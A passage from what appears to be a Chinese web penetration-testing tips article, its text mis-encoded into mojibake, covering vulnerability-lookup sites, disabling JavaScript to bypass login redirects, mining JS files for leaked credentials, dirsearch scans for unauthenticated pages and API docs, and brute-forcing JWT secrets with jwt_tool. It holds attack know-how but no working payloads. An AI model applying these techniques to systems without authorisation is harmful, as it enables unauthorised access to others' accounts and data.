http://finger.tidesec.net/(æ½®æ±åœ¨çº¿æŒ‡çº¹è¯†åˆ«)http://wiki.peiqi.tech/(peiqiæ–‡åº“(æ¼æ´åº“),å…ˆæŸ¥è¿™ä¸ªå¤ç°è¿‡ç¨‹éå¸¸è¯¦ç»†)https://avd.aliyun.com/(é˜¿é‡Œäº‘æ¼æ´åº“,peiqiæ–‡åº“æŸ¥ä¸åˆ°å†å·®è¿™ä¸ª)
```



------

###  

### **5. jsç›¸å…³**



- ç¦ç”¨jsï¼šéƒ¨åˆ†ç«™ç‚¹ä¼šå…ˆè·³è½¬åˆ°ç±»ä¼¼`/admin/index.html`çš„é¡µé¢ï¼Œç„¶åæ£€æµ‹åˆ°æœªç™»å½•ä¼šå†è·³è½¬åˆ°`/login.html` å¯¹äºè¿™ç§æˆ‘ä»¬å¯ä»¥ç¦ç”¨ javascript æµ‹è¯•ï¼Œä¼šæœ‰æ„æƒ³ä¸åˆ°çš„å‘ç”Ÿ
- æŸ¥çœ‹jsä»£ç ï¼šjsä»£ç ä¸­ç»å¸¸ä¼šæ³„éœ²æœ‰è¶£çš„ä¸œè¥¿ï¼Œè¿™é‡Œå†æ¨èä¸€ä¸‹ FindSomethingè¿™ä¸ªæ’ä»¶å¯ä»¥å¿«é€Ÿåœ°å‘ç°jsä¸­é‡è¦ä¿¡æ¯
  ä¸‹å›¾ä¸ºjsæ³„éœ²äº†ç”¨æˆ·åå¯†ç ï¼š

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhljmp0a0iagPFmgshG1u3liaue1mml6TbSd4jLnf98WVjZpdxWAIR82jg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

------

### ** **

### **6. æœªæˆæƒ** 



å¯ä»¥å€ŸåŠ©dirsearchå·¥å…·è¿›è¡Œç›®å½•æ‰«æ

- æ— éœ€ç™»å½•å³å¯è®¿é—®çš„é¡µé¢
- apiæ¥å£æ–‡æ¡£ï¼šè¶Šæ¥è¶Šå¤šçš„ç½‘ç«™é‡‡ç”¨å‰åç«¯åˆ†ç¦»æ¥å¼€å‘ï¼Œå¼€å‘å®Œæˆåapiæ¥å£æ–‡æ¡£å¯ç›´æ¥è®¿é—®ï¼Œæ‰«æåˆ°apiæ¥å£æ–‡æ¡£åå¯æ ¹æ®æ–‡æ¡£æ„é€ è¯·æ±‚åŒ…è¿›è¡Œæµ‹è¯•ï¼š

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhh0BVSBKNnUdfMZITcCCxB28oHnX0SFqFxdRxEgmqpPTGC4IVdAPm8w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

##  

------



**7. jwtç›¸å…³**

Json web token (JWT), æ˜¯ä¸ºäº†åœ¨ç½‘ç»œåº”ç”¨ç¯å¢ƒé—´ä¼ é€’å£°æ˜è€Œæ‰§è¡Œçš„ä¸€ç§åŸºäºJSONçš„å¼€æ”¾æ ‡å‡†.è¯¥tokenè¢«è®¾è®¡ä¸ºç´§å‡‘ä¸”å®‰å…¨çš„ï¼Œç‰¹åˆ«é€‚ç”¨äºåˆ†å¸ƒå¼ç«™ç‚¹çš„å•ç‚¹ç™»å½•

- çˆ†ç ´å¯†é’¥: è¿™é‡Œæ¨èä½¿ç”¨jwt_toolå·¥å…·,å­—å…¸ä¸ç”¨å¤ªå¤§çˆ†ä¸ªtop1k/top1wçš„å°±å·®ä¸å¤šäº† å‡ºä¸å‡ºéšç¼˜

- 

```
https://github.com/ticarpi/jwt_tool
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhL9Oj61lNfjZkjFhD9lafsZvicbAV300Y9BrRIjrrACBS0t96v9M0MHw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)









